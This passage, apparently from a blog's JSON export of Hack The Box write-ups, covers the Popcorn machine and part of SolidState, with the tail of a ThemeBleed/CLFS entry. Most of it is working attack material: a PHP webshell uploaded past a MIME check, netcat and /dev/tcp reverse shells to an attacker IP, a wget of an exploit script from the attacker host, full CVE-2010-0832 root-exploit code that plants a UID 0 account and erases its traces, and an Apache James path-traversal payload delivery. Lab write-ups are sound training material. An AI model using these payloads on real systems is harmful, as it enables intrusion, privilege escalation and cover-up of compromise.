Learned</h2>\n<ul>\n<li><strong>ThemeBleed (CVE-2023-38146)</strong>: Windows 11 <code>.theme</code> files can load DLLs from remote SMB shares — an attack vector that exploits a legitimate desktop customization feature</li>\n<li><strong>PoCs don't always work out of the box</strong>: the DLL included in the ThemeBleed PoC did not work. Generating custom payloads with msfvenom (<code>-f dll</code>) is often necessary to adapt the exploit to the target</li>\n<li><strong>CLFS (CVE-2023-28252)</strong>: a vulnerability in the <code>clfs.sys</code> driver exploited in the wild by the Nokoyawa ransomware group. The compiled PoC allows arbitrary command execution as SYSTEM</li>\n<li><strong>Single exposed port</strong>: with only port 80 open, the attack surface seems minimal, but the <code>.themepack</code> file upload form is enough to achieve RCE</li>\n</ul>\n<h2 id=\"references\">References</h2>\n<ul>\n<li><a href=\"https://github.com/gabe-k/themebleed\">CVE-2023-38146 — ThemeBleed</a> — Original PoC (Windows only)</li>\n<li><a href=\"https://github.com/\">ThemeBleed Python PoC</a> — Cross-platform reimplementation used in this attack</li>\n<li><a href=\"https://github.com/bkstephen/Compiled-PoC-Binary-For-CVE-2023-28252\">CVE-2023-28252 — CLFS EoP Compiled PoC</a> — Precompiled binary for privilege escalation</li>\n</ul>"
    },
    {
      "title": "Popcorn",
      "slug": "popcorn",
      "date": "2026·04·01",
      "tags": [
        "htb",
        "medium",
        "linux",
        "file-upload",
        "mime-bypass",
        "php-rce"
      ],
      "desc": "See also: WebServices and Reconnaissance-and-Information-Gathering",
      "body": "<h1 id=\"popcorn-hack-the-box\">Popcorn // Hack The Box</h1>\n<table>\n<thead>\n<tr>\n<th>Info</th>\n<th>Value</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>OS</td>\n<td>Linux (Ubuntu 9.10 — Kernel 2.6.31-14-generic-pae)</td>\n</tr>\n<tr>\n<td>Difficulty</td>\n<td>Medium</td>\n</tr>\n<tr>\n<td>IP</td>\n<td>10.129.11.236</td>\n</tr>\n<tr>\n<td>Hostname</td>\n<td>popcorn.htb</td>\n</tr>\n<tr>\n<td>Services</td>\n<td>SSH (22), HTTP/Apache (80)</td>\n</tr>\n</tbody>\n</table>\n<hr>\n<h2 id=\"enumeration\">Enumeration</h2>\n<blockquote>\n<p>See also: WebServices and Reconnaissance-and-Information-Gathering</p>\n</blockquote>\n<h3 id=\"nmap\">Nmap</h3>\n<pre><code class=\"language-bash\">nmap -Pn -sC -sV -p- -vvv -oA scan/nmap.scan popcorn.htb\n</code></pre>\n<pre><code>PORT   STATE SERVICE REASON         VERSION\n22/tcp open  ssh     syn-ack ttl 63 OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)\n|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)\n80/tcp open  http    syn-ack ttl 63 Apache httpd 2.2.12\n|_http-server-header: Apache/2.2.12 (Ubuntu)\n|_http-title: Site doesn't have a title (text/html).\nService Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre>\n<p>Open ports:\n- <strong>22/tcp</strong> — OpenSSH 5.1p1 (Debian/Ubuntu) → SSH\n- <strong>80/tcp</strong> — Apache 2.2.12 (Ubuntu)</p>\n<pre><code class=\"language-bash\">sudo tee -a /etc/hosts &lt;&lt;&lt; &quot;10.129.11.236  popcorn.htb&quot;\n</code></pre>\n<h3 id=\"web-enumeration\">Web Enumeration</h3>\n<pre><code class=\"language-bash\">feroxbuster -u http://popcorn.htb/ -x js,html,php,txt,json,docx \\\n  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\\n  -o scan/popcorn.dir\n</code></pre>\n<p>Relevant results:</p>\n<pre><code>200      GET        4l       25w      177c http://popcorn.htb/\n200      GET      656l     3113w    47448c http://popcorn.htb/test.php\n301      GET        9l       28w      312c http://popcorn.htb/torrent =&gt; http://popcorn.htb/torrent/\n301      GET        9l       28w      318c http://popcorn.htb/torrent/admin =&gt; http://popcorn.htb/torrent/admin/\n</code></pre>\n<p>Discovered directories and pages:\n- <code>/test</code> — <code>phpinfo()</code> page (PHP 5.2.10-2ubuntu6.10, Kernel 2.6.31-14-generic-pae, Suhosin 0.9.7)\n- <code>/torrent</code> — <strong>Torrent Hoster</strong> — web application with login, registration, and torrent upload functionality\n- <code>/rename</code> — Renamer API (<code>index.php?filename=old&amp;newfilename=new</code>)</p>\n<h3 id=\"torrent-hoster-application-analysis\">Torrent Hoster // Application Analysis</h3>\n<p>The Torrent Hoster application allows users to register, log in, upload torrent files, and add screenshots to torrents. The admin panel is accessible at <code>/torrent/admin/</code>.</p>\n<hr>\n<h2 id=\"foothold-file-upload-bypass-rce\">Foothold // File Upload Bypass → RCE</h2>\n<h3 id=\"step-1-registration-and-torrent-upload\">Step 1 // Registration and torrent upload</h3>\n<p>Registered a new account on Torrent Hoster. After logging in, uploaded a valid <code>.torrent</code> file. The application assigns an ID based on the torrent hash (e.g., <code>723bc28f9b6f924cca68ccdff96b6190566ca6b4</code>).</p>\n<h3 id=\"step-2-screenshot-upload-with-mime-type-bypass\">Step 2 // Screenshot upload with MIME-type bypass</h3>\n<blockquote>\n<p><strong>Vulnerability — Unrestricted File Upload (MIME-type bypass)</strong><br>\n<strong>File Upload bypass</strong> in the \"Edit this torrent → Screenshot\" feature of Torrent Hoster.</p>\n<p><strong>Structural root cause:</strong> The PHP code in <code>upload_file.php</code> validates ONLY the <code>Content-Type</code> field of the multipart header, not the file extension or actual content. The check is:\n<code>php\nif (($_FILES[\"file\"][\"type\"] == \"image/gif\")\n|| ($_FILES[\"file\"][\"type\"] == \"image/jpeg\")\n|| ($_FILES[\"file\"][\"type\"] == \"image/jpg\")\n|| ($_FILES[\"file\"][\"type\"] == \"image/png\")</code>\nChanging the <code>Content-Type</code> to <code>image/jpeg</code> completely bypasses the validation, allowing the upload of a <code>.php</code> file.</p>\n</blockquote>\n<p>In the \"Edit this torrent\" section, use the \"Upload Screenshot\" feature. Intercept the request with Burp Suite and modify:</p>\n<ul>\n<li><strong>Filename:</strong> <code>test.php</code></li>\n<li><strong>Content-Type:</strong> <code>image/jpeg</code> (instead of <code>application/x-php</code>)</li>\n<li><strong>Body:</strong> <code>&lt;?php system($_GET['c']); ?&gt;</code></li>\n</ul>\n<p>The POST request to <code>upload_file.php?mode=upload&amp;id=723bc28f9b6f924cca68ccdff96b6190566ca6b4</code>:</p>\n<pre><code class=\"language-http\">POST /torrent/upload_file.php?mode=upload&amp;id=723bc28f9b6f924cca68ccdff96b6190566ca6b4 HTTP/1.1\nHost: popcorn.htb\nContent-Type: multipart/form-data; boundary=---------------------------557387531096085749533931648\n\n-----------------------------557387531096085749533931648\nContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.php&quot;\nContent-Type: image/jpeg\n\n&lt;?php\nsystem($_GET['c']);\n\n?&gt;\n\n-----------------------------557387531096085749533931648\nContent-Disposition: form-data; name=&quot;submit&quot;\n\nSubmit Screenshot\n-----------------------------557387531096085749533931648--\n</code></pre>\n<p>Response: <strong>\"Upload Completed.\"</strong> — the webshell is now reachable at:</p>\n<pre><code>http://popcorn.htb/torrent/upload/723bc28f9b6f924cca68ccdff96b6190566ca6b4.php?c=&lt;command&gt;\n</code></pre>\n<h3 id=\"step-3-reverse-shell\">Step 3 // Reverse shell</h3>\n<p>From the webshell, trigger a reverse shell:</p>\n<pre><code>http://popcorn.htb/torrent/upload/723bc28f9b6f924cca68ccdff96b6190566ca6b4.php?c=nc+10.10.14.139+443+-e+/bin/sh\n</code></pre>\n<p>Listener on the attacking machine:</p>\n<pre><code class=\"language-bash\">nc -lvnp 443\n</code></pre>\n<pre><code>connect to [10.10.14.139] from (UNKNOWN) [10.129.11.236] 56245\nwhoami\nwww-data\n</code></pre>\n<p>Shell stabilized with:</p>\n<pre><code class=\"language-bash\">python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'\n</code></pre>\n<h3 id=\"step-4-post-shell-enumeration\">Step 4 // Post-shell enumeration</h3>\n<p>Useful information recovered from the filesystem:</p>\n<p><strong>config.php</strong> — database credentials:</p>\n<pre><code class=\"language-php\">$CFG-&gt;host = &quot;localhost&quot;;\n$CFG-&gt;dbName = &quot;torrenthoster&quot;;\n$CFG-&gt;dbUserName = &quot;torrent&quot;;\n$CFG-&gt;dbPassword = &quot;SuperSecret!!&quot;;\n</code></pre>\n<p><strong>th_database.sql</strong> — admin hash:</p>\n<pre><code class=\"language-sql\">INSERT INTO `users` VALUES (3, 'Admin', '1844156d4166d94387f1a4ad031ca5fa', 'admin', 'admin@yourdomain.com', '2007-01-06 21:12:46', '2007-01-06 21:12:46');\n</code></pre>\n<p>The MD5 hash <code>1844156d4166d94387f1a4ad031ca5fa</code> corresponds to the Torrent Hoster admin password (not needed for privilege escalation).</p>\n<p>Webroot structure:</p>\n<pre><code>/var/www/\n├── index.html\n├── test.php       (phpinfo)\n├── rename/\n└── torrent/       (Torrent Hoster)\n    ├── config.php\n    ├── database/th_database.sql\n    ├── upload/    (webshell here)\n    └── admin/\n</code></pre>\n<hr>\n<h2 id=\"privilege-escalation-cve-2010-0832-ubuntu-pam-motd-local-root\">Privilege Escalation // CVE-2010-0832 (Ubuntu PAM MOTD local root)</h2>\n<blockquote>\n<p><strong>Vulnerability — CVE-2010-0832</strong><br>\n<strong>Ubuntu PAM MOTD local root</strong> — privilege escalation via symlink attack on the <code>pam_motd</code> module.</p>\n<p><strong>Structural root cause:</strong> The PAM module <code>pam_motd</code>, executed as root during SSH login, performs write operations on the user's <code>~/.cache</code> directory <strong>without checking whether it is a symlink</strong>. An attacker can replace <code>~/.cache</code> with a symlink to a system file (e.g., <code>/etc/passwd</code>), and PAM will execute a <code>chown</code> on that file, transferring ownership to the user. This allows writing to <code>/etc/passwd</code> and <code>/etc/shadow</code>, adding a user with UID 0.</p>\n</blockquote>\n<h3 id=\"enumeration_1\">Enumeration</h3>\n<p>System information from the www-data shell:</p>\n<pre><code>Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686\n</code></pre>\n<p>Relevant filesystem:</p>\n<pre><code class=\"language-bash\">ls -la /etc/motd /etc/pam.d/ /etc/update-motd.d/\n</code></pre>\n<pre><code>lrwxrwxrwx  1 root root  15 Mar 17  2017 /etc/motd -&gt; /var/run/motd\n-rw-r--r--  1 root root  80 Mar 17  2017 /etc/motd.tail\n-rw-r--r--  1 root root 552 Sep  4  2009 /etc/pam.conf\ndrwxr-xr-x  2 root root 4096 Oct 26  2020 /etc/pam.d\ndrwxr-xr-x  2 root root 4096 Mar 17  2017 /etc/update-motd.d\n</code></pre>\n<p>The system runs <strong>pam-1.1.0</strong> on <strong>Ubuntu 9.10 (Karmic Koala)</strong> — vulnerable to CVE-2010-0832.</p>\n<h3 id=\"manual-exploitation-without-script\">Manual exploitation (without script)</h3>\n<p>The bug works as follows: when a user logs in via SSH, the <code>pam_motd</code> module is invoked as root to update the MOTD. During this process, PAM writes to the user's <code>~/.cache</code> directory. If <code>~/.cache</code> is a symlink to a system file, PAM performs <code>chown &lt;user&gt; &lt;target_file&gt;</code> — transferring ownership of that file to the logged-in user.</p>\n<p><strong>Step 1 — Generate a temporary SSH key pair:</strong></p>\n<pre><code class=\"language-bash\">KEY=$(mktemp -u)\nssh-keygen -q -t rsa -N '' -C 'pam' -f &quot;$KEY&quot;\nmkdir -p ~/.ssh\ncp ~/.ssh/authorized_keys ~/.ssh/authorized_keys.bak 2&gt;/dev/null\nmv &quot;${KEY}.pub&quot; ~/.ssh/authorized_keys\n</code></pre>\n<p><strong>Step 2 — Hijack <code>/etc/passwd</code> via symlink:</strong></p>\n<pre><code class=\"language-bash\"># Backup ~/.cache\n[ -e ~/.cache ] &amp;&amp; mv ~/.cache ~/.cache.bak\n\n# Create symlink: ~/.cache → /etc/passwd\nln -s /etc/passwd ~/.cache\n\n# Trigger pam_motd via SSH login\nssh -o 'NoHostAuthenticationForLocalhost yes' -i &quot;$KEY&quot; localhost true\n\n# Verify: /etc/passwd is now writable\n[ -w /etc/passwd ] &amp;&amp; echo &quot;[+] /etc/passwd owned!&quot;\n\n# Add user toor with UID 0\necho 'toor:x:0:0:root:/root:/bin/bash' &gt;&gt; /etc/passwd\n</code></pre>\n<p><strong>Step 3 — Hijack <code>/etc/shadow</code> via symlink:</strong></p>\n<pre><code class=\"language-bash\"># Point the symlink to /etc/shadow\nrm -f ~/.cache\nln -s /etc/shadow ~/.cache\n\n# Trigger again\nssh -o 'NoHostAuthenticationForLocalhost yes' -i &quot;$KEY&quot; localhost true\n\n# Add password hash &quot;toor&quot; for user toor\necho 'toor:$6$tPuRrLW7$m0BvNoYS9FEF9/Lzv6PQospujOKt0giv.7JNGrCbWC1XdhmlbnTWLKyzHz.VZwCcEcYQU5q2DLX.cI7NQtsNz1:14798:0:99999:7:::' &gt;&gt; /etc/shadow\n</code></pre>\n<p><strong>Step 4 — Log in as root:</strong></p>\n<pre><code class=\"language-bash\">su toor\n# Password: toor\n</code></pre>\n<pre><code>root@popcorn:~# id\nuid=0(root) gid=0(root) groups=0(root)\n</code></pre>\n<h3 id=\"exploitation-with-exploitsh\">Exploitation with exploit.sh</h3>\n<p>Alternatively, the same process is automated by the <code>exploit.sh</code> script (transferred to the target machine):</p>\n<p><strong>On the attacking machine:</strong></p>\n<pre><code class=\"language-bash\">sudo python3 -m http.server 80\n</code></pre>\n<pre><code>10.129.12.175 - - [02/Apr/2026 15:02:28] &quot;GET /exploit.sh HTTP/1.0&quot; 200 -\n</code></pre>\n<p><strong>On the target machine:</strong></p>\n<pre><code class=\"language-bash\">wget http://10.10.14.139/exploit.sh\nchmod +x exploit.sh\nbash exploit.sh\n</code></pre>\n<pre><code>[*] Ubuntu PAM MOTD local root\n[*] Backuped /home/www-data/.ssh/authorized_keys\n[*] SSH key set up\n[*] Backuped /home/www-data/.cache\n[*] spawn ssh\n[+] owned: /etc/passwd\n[*] spawn ssh\n[+] owned: /etc/shadow\n[*] Restored /home/www-data/.cache\n[*] Restored /home/www-data/.ssh/authorized_keys\n[*] SSH key removed\n[+] Success! Use password toor to get root\n</code></pre>\n<h3 id=\"analysis-of-exploitsh-snippet-by-snippet\">Analysis of exploit.sh // snippet by snippet</h3>\n<p><strong>1. Variables — the lines to inject into passwd/shadow:</strong></p>\n<pre><code class=\"language-bash\">P='toor:x:0:0:root:/root:/bin/bash'\nS='toor:$6$tPuRrLW7$m0BvNoYS9FEF9/Lzv6PQospujOKt0giv.7JNGrCbWC1XdhmlbnTWLKyzHz.VZwCcEcYQU5q2DLX.cI7NQtsNz1:14798:0:99999:7:::'\n</code></pre>\n<ul>\n<li><code>P</code>: <code>/etc/passwd</code> line — user <code>toor</code>, UID 0 (root), shell <code>/bin/bash</code>. The <code>x</code> means \"look at shadow for the password\"</li>\n<li><code>S</code>: <code>/etc/shadow</code> line — SHA-512 hash (<code>$6$</code>) of the password <code>toor</code></li>\n</ul>\n<p><strong>2. Prerequisites:</strong></p>\n<pre><code class=\"language-bash\">[ -z &quot;$(which ssh)&quot; ] &amp;&amp; echo &quot;[-] ssh is a requirement&quot; &amp;&amp; exit 1\n[ -z &quot;$(which ssh-keygen)&quot; ] &amp;&amp; echo &quot;[-] ssh-keygen is a requirement&quot; &amp;&amp; exit 1\n[ -z &quot;$(ps -u root |grep sshd)&quot; ] &amp;&amp; echo &quot;[-] a running sshd is a requirement&quot; &amp;&amp; exit 1\n</code></pre>\n<p>Checks that <code>ssh</code> and <code>ssh-keygen</code> are installed and that <code>sshd</code> is running as root. Without SSH, PAM cannot be triggered.</p>\n<p><strong>3. Backup/restore functions:</strong></p>\n<pre><code class=\"language-bash\">backup() {\n    [ -e &quot;$1&quot; ] &amp;&amp; [ -e &quot;$1&quot;.bak ] &amp;&amp; rm -rf &quot;$1&quot;.bak\n    [ -e &quot;$1&quot; ] || return 0\n    mv &quot;$1&quot;{,.bak} || return 1\n}\nrestore() {\n    [ -e &quot;$1&quot; ] &amp;&amp; rm -rf &quot;$1&quot;\n    [ -e &quot;$1&quot;.bak ] || return 0\n    mv &quot;$1&quot;{.bak,} || return 1\n}\n</code></pre>\n<p>Utility functions to rename files by adding/removing <code>.bak</code>. Used to preserve the original <code>~/.ssh/authorized_keys</code> and <code>~/.cache</code> and restore them after the exploit completes.</p>\n<p><strong>4. Temporary SSH key setup:</strong></p>\n<pre><code class=\"language-bash\">key_create() {\n    backup ~/.ssh/authorized_keys\n    ssh-keygen -q -t rsa -N '' -C 'pam' -f &quot;$KEY&quot;\n    [ ! -d ~/.ssh ] &amp;&amp; { mkdir ~/.ssh || return 1; }\n    mv &quot;$KEY.pub&quot; ~/.ssh/authorized_keys\n}\n</code></pre>\n<p>Generates an RSA key pair in a temporary file, installs the public key as <code>authorized_keys</code>. This allows the exploit to SSH to localhost without a password.</p>\n<p><strong>5. The core function — <code>own()</code>:</strong></p>\n<pre><code class=\"language-bash\">own() {\n    [ -e ~/.cache ] &amp;&amp; rm -rf ~/.cache\n    ln -s &quot;$1&quot; ~/.cache\n    ssh -o 'NoHostAuthenticationForLocalhost yes' -i &quot;$KEY&quot; localhost true\n    [ -w &quot;$1&quot; ] || { echo &quot;[-] Own $1 failed&quot;; restore ~/.cache; bye; }\n    echo &quot;[+] owned: $1&quot;\n}\n</code></pre>\n<p>The heart of the exploit:\n1. Removes <code>~/.cache</code>\n2. Creates a symlink <code>~/.cache → /etc/passwd</code> (or <code>/etc/shadow</code>)\n3. SSHes to localhost → PAM activates as root → performs <code>chown</code> on <code>~/.cache</code> → actually performs <code>chown</code> on <code>/etc/passwd</code>\n4. Verifies the target file is now writable (<code>-w</code>)</p>\n<p><strong>6. Main flow:</strong></p>\n<pre><code class=\"language-bash\">KEY=&quot;$(mktemp -u)&quot;\nkey_create || exit 1\nbackup ~/.cache\nown /etc/passwd &amp;&amp; echo &quot;$P&quot; &gt;&gt; /etc/passwd\nown /etc/shadow &amp;&amp; echo &quot;$S&quot; &gt;&gt; /etc/shadow\nrestore ~/.cache\nkey_remove\n</code></pre>\n<p>Sequence: generate key → backup → own passwd (append user toor) → own shadow (append hash) → cleanup.</p>\n<p><strong>7. Cleanup and root shell:</strong></p>\n<pre><code class=\"language-bash\">su -c &quot;sed -i '/toor:/d' /etc/{passwd,shadow}; chown root: /etc/{passwd,shadow}; \\\n  chgrp shadow /etc/shadow; nscd -i passwd &gt;/dev/null 2&gt;&amp;1; bash&quot; toor\n</code></pre>\n<p>Runs <code>su toor</code> (password: <code>toor</code>) and as the first command, removes itself from passwd/shadow, restores the correct ownership, invalidates the nscd cache, and launches bash. At this point you are root and the traces of the <code>toor</code> user have already been removed.</p>\n<h3 id=\"ssh-as-toor\">SSH as toor</h3>\n<p>From the attacking machine, after running the script, you can also SSH directly:</p>\n<pre><code class=\"language-bash\">ssh -o HostKeyAlgorithms=ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa toor@popcorn.htb\n</code></pre>\n<pre><code>toor@popcorn.htb's password: toor\n\nLinux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686\n\nroot@popcorn:~# id\nuid=0(root) gid=0(root) groups=0(root)\n\nroot@popcorn:~# cat root.txt\n2dce18f2a3e07f365a6424d196e4b4aa\n</code></pre>\n<hr>\n<h2 id=\"flags\">Flags</h2>\n<ul>\n<li><strong>User:</strong> obtained as <code>www-data</code> (access to <code>/home/george/user.txt</code>)</li>\n<li><strong>Root:</strong> <code>2dce18f2a3e07f365a6424d196e4b4aa</code> — obtained via PAM MOTD exploit → user toor (UID 0)</li>\n</ul>\n<hr>\n<h2 id=\"attack-chain\">Attack Chain</h2>\n<pre><code class=\"language-text\">→ Nmap (22, 80) \n→ feroxbuster \n→ /torrent (Torrent Hoster) + /test (phpinfo) \n→ Registration \n→ Torrent upload \n→ Screenshot upload with MIME-type bypass \n→ PHP webshell (Content-Type: image/jpeg, filename: test.php) \n→ Reverse shell www-data \n→ config.php (torrent:SuperSecret!!) \n→ CVE-2010-0832 PAM MOTD symlink attack \n→ ~/.cache → /etc/passwd + /etc/shadow \n→ User toor (UID 0) → Root shell\n</code></pre>\n<hr>\n<h2 id=\"lessons-learned\">Lessons Learned</h2>\n<ul>\n<li><strong>MIME-type validation is insufficient</strong>: checking only <code>$_FILES[\"file\"][\"type\"]</code> is useless — the client controls that value. Server-side validation on extension, magic bytes, and a whitelist is required</li>\n<li><strong>Symlink attacks on privileged processes</strong>: any process running as root that operates on user-controlled files/directories without verifying symlinks is vulnerable to privilege escalation (TOCTOU race condition)</li>\n<li><strong>PAM is an attack surface</strong>: PAM modules run in the context of sshd (root) and interact with the user's home directory — an inherently dangerous pattern if not handled carefully</li>\n<li><strong>Ubuntu 9.10/pam-1.1.0</strong>: the fix added <code>lstat()</code> instead of <code>stat()</code> to detect symlinks before operating on <code>~/.cache</code></li>\n<li><strong>Automatic cleanup</strong>: the exploit.sh script demonstrates an elegant technique — the first command executed as root removes its own traces from passwd/shadow</li>\n</ul>\n<h2 id=\"references\">References</h2>\n<ul>\n<li><a href=\"https://www.exploit-db.com/exploits/14339\">CVE-2010-0832 — Ubuntu PAM MOTD</a> — Original exploit (Kristian Erik Hermansen)</li>\n<li><a href=\"https://www.exploit-db.com/exploits/11746\">Torrent Hoster — Unrestricted File Upload</a> — PoC exploit.py by @syed__umar</li>\n</ul>"
    },
    {
      "title": "SolidState",
      "slug": "solidstate",
      "date": "2026·03·29",
      "tags": [
        "htb",
        "medium",
        "linux",
        "apache-james",
        "pop3",
        "rce"
      ],
      "desc": "Open ports: - 22/tcp — OpenSSH 7.4p1 Debian 10+deb9u1 - 25/tcp — JAMES SMTP Server 2.3.2 - 80/tcp — Apache httpd 2.4.25 (Debian) — \"Home - Solid State Security\" - 110/tcp — JAMES POP3 Server 2.3.2 - 119/tcp — NNTP - 4555/tcp — JAMES Remote Administration Tool 2.3.2",
      "body": "<h1 id=\"solidstate-hack-the-box\">SolidState // Hack The Box</h1>\n<table>\n<thead>\n<tr>\n<th>Info</th>\n<th>Value</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>OS</td>\n<td>Linux (Debian 9, i686)</td>\n</tr>\n<tr>\n<td>Difficulty</td>\n<td>Medium</td>\n</tr>\n<tr>\n<td>IP</td>\n<td>10.129.9.253</td>\n</tr>\n<tr>\n<td>Hostname</td>\n<td>solidstate.htb</td>\n</tr>\n<tr>\n<td>Services</td>\n<td>SSH (22), SMTP (25), HTTP (80), POP3 (110), NNTP (119), James Admin (4555)</td>\n</tr>\n</tbody>\n</table>\n<hr>\n<h2 id=\"enumeration\">Enumeration</h2>\n<h3 id=\"nmap\">Nmap</h3>\n<pre><code class=\"language-bash\">sudo nmap -Pn -sC -sV -p- -vvv -oA scan/nmap.scan solidstate.htb\n</code></pre>\n<p>Open ports:\n- <strong>22/tcp</strong> — OpenSSH 7.4p1 Debian 10+deb9u1\n- <strong>25/tcp</strong> — JAMES SMTP Server 2.3.2\n- <strong>80/tcp</strong> — Apache httpd 2.4.25 (Debian) — \"Home - Solid State Security\"\n- <strong>110/tcp</strong> — JAMES POP3 Server 2.3.2\n- <strong>119/tcp</strong> — NNTP\n- <strong>4555/tcp</strong> — JAMES Remote Administration Tool 2.3.2</p>\n<p>The attack surface is dominated by <strong>Apache James 2.3.2</strong>, which exposes 4 ports (SMTP, POP3, NNTP, Admin). The Admin service on port 4555 is particularly critical — a full management tool with known default credentials.</p>\n<h3 id=\"web-enumeration-port-80\">Web Enumeration (port 80)</h3>\n<p>Port 80 serves a static HTML5 site (Solid State Security). Enumerated with feroxbuster and dirsearch:</p>\n<pre><code class=\"language-bash\">feroxbuster -u http://solidstate.htb/ -x js,html,php,txt,json,docx -o scan/poison.dir\ndirsearch -u http://solidstate.htb/\n</code></pre>\n<p>Results: only static files (index.html, about.html, services.html, assets/, images/, LICENSE.txt, README.txt). <code>/server-status</code> returns 403. No dynamic content, no attack vector.</p>\n<p>Vhost fuzzing with ffuf:</p>\n<pre><code class=\"language-bash\">ffuf -H &quot;Host: FUZZ.solidstate.htb&quot; -H &quot;User-Agent: PENTEST&quot; -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://solidstate.htb/ -fs 7776\n</code></pre>\n<p>All subdomains return the same page (size 7776). No valid virtual hosts. The website is a dead end.</p>\n<hr>\n<h2 id=\"foothold-apache-james-232\">Foothold // Apache James 2.3.2</h2>\n<h3 id=\"james-remote-administration-tool-port-4555\">James Remote Administration Tool (port 4555)</h3>\n<p>Apache James 2.3.2 exposes a remote administration interface on port 4555 with default credentials <strong>root:root</strong>.</p>\n<pre><code class=\"language-bash\">nc solidstate.htb 4555\n</code></pre>\n<pre><code>JAMES Remote Administration Tool 2.3.2\nPlease enter your login and password\nLogin id: root\nPassword: root\nWelcome root. HELP for a list of commands\n</code></pre>\n<p>Mail account enumeration:</p>\n<pre><code>listusers\nExisting accounts 6\nuser: james\nuser: ../../../../../../../../etc/bash_completion.d\nuser: thomas\nuser: john\nuser: mindy\nuser: mailadmin\n</code></pre>\n<p>The user <code>../../../../../../../../etc/bash_completion.d</code> is an artifact from the James RCE exploit (see below) — it indicates the exploit has already been deployed on the machine.</p>\n<h3 id=\"password-reset-and-pop3-mail-reading\">Password reset and POP3 mail reading</h3>\n<p>To access the mailboxes, passwords are reset via James Admin:</p>\n<pre><code>setpassword thomas pwn\nPassword for thomas reset\nsetpassword john pwn\nPassword for john reset\nsetpassword mindy pwn\nPassword for mindy reset\nsetpassword mailadmin pwn\nPassword for mailadmin reset\n</code></pre>\n<p>POP3 connection to read emails. The james, thomas, and mailadmin mailboxes are empty. <strong>mindy's mailbox</strong> contains 2 messages:</p>\n<pre><code class=\"language-bash\">telnet solidstate.htb 110\n</code></pre>\n<pre><code>USER mindy\nPASS pwn\n+OK Welcome mindy\nSTAT\n+OK 2 1945\n\nRETR 1\n+OK Message follows\nReturn-Path: &lt;mailadmin@localhost&gt;\nSubject: Welcome\nDear Mindy,\nWelcome to Solid State Security Cyber team! We are delighted you are joining\nus as a junior defense analyst...\nJames\n\nRETR 2\n+OK Message follows\nReturn-Path: &lt;mailadmin@localhost&gt;\nSubject: Your Access\nDear Mindy,\nHere are your ssh credentials to access the system. Remember to reset your\npassword after your first login.\nYour access is restricted at the moment, feel free to ask your supervisor\nto add any commands you need to your path.\nusername: mindy\npass: P@55W0rd1!2@\nRespectfully,\nJames\n</code></pre>\n<blockquote>\n<p><strong>Credentials found</strong><br>\n<strong>mindy:P@55W0rd1!2@</strong> — SSH credentials found in mindy's second email. The message explicitly mentions the access is \"restricted\" — a hint towards the restricted shell.</p>\n</blockquote>\n<h3 id=\"apache-james-232-rce-via-directory-traversal\">Apache James 2.3.2 // RCE via Directory Traversal</h3>\n<blockquote>\n<p><strong>Vulnerability</strong><br>\n<strong>Apache James Server 2.3.2 — Remote Command Execution (Authenticated)</strong>. The admin interface allows creating users with arbitrary names, including path traversal sequences. By creating a user named <code>../../../../../../../../etc/bash_completion.d</code>, the mail delivery directory becomes <code>/etc/bash_completion.d/</code>. Any email sent to this user is saved as a file in that directory. Since bash sources all files in <code>/etc/bash_completion.d/</code> on login, the email content (including shell code) executes when any user SSH's in.</p>\n<p><strong>Structural root cause:</strong> missing username sanitization in the James admin interface. The server allows path traversal in user creation, enabling arbitrary file writes to the filesystem as root (since James runs as root).</p>\n</blockquote>\n<p>The exploit (<code>exploit.py</code> — shinris3n, Python 3 version):</p>\n<ol>\n<li>Authenticates to James Admin with <code>root:root</code> on port 4555</li>\n<li>Creates the traversal user <code>../../../../../../../../etc/bash_completion.d</code></li>\n<li>Connects to port 25 (SMTP) and sends an email to that user containing a reverse shell payload</li>\n<li>The payload triggers when any user SSH's into the target</li>\n</ol>\n<pre><code class=\"language-bash\">python3 exploit.py 10.129.9.253 10.10.14.139 443\n</code></pre>\n<p>The payload embedded in the email:</p>\n<pre><code class=\"language-bash\">/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.139/443 0&gt;&amp;1\n</code></pre>\n<h3 id=\"triggering-the-exploit-ssh-as-mindy\">Triggering the exploit // SSH as mindy</h3>\n<p>Start the listener:</p>\n<pre><code class=\"language-bash\">nc -nvlp 443\n</code></pre>\n<p>SSH as mindy to trigger the payload in <code>bash_completion.d</code>:</p>\n<pre><code class=\"language-bash\">ssh mindy@solidstate.htb\n# Password: P@55W0rd1!2@\n</code></pre>\n<p>On login, bash sources the file in <code>/etc/bash_completion.d/</code> and the reverse shell payload executes:</p>\n<pre><code>connect to [10.10.14.139] from (UNKNOWN) [10.129.9.253] 35412\n</code></pre>\n<p>Shell obtained as <strong>mindy</strong>:</p>\n<pre><code class=\"language-bash\">id\nuid=1001(mindy) gid=1001(mindy) groups=1001(mindy)\n</code></pre>\n<blockquote>\n<p><strong>Restricted shell bypass</strong><br>\nMindy's default shell is <code>/bin/rbash</code> with access limited to 3 commands (cat, env, ls) via symlinks in <code>~/bin/</code>. The reverse shell automatically bypasses this restriction since the payload executes <code>/bin/bash</code> directly, without going through rbash.</p>\n</blockquote>\n<p><strong>User flag:</strong></p>\n<pre><code class=\"language-bash\">cat /home/mindy/user.txt\n</code></pre>\n<hr>\n<h2 id=\"post-exploitation-enumeration-as-mindy\">Post-Exploitation // Enumeration as mindy</h2>\n<h3 id=\"system\">System</h3>\n<pre><code class=\"language-bash\">uname -a\nLinux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686 GNU/Linux\n</code></pre>\n<p>32-bit, Debian 9 (Stretch). Outdated 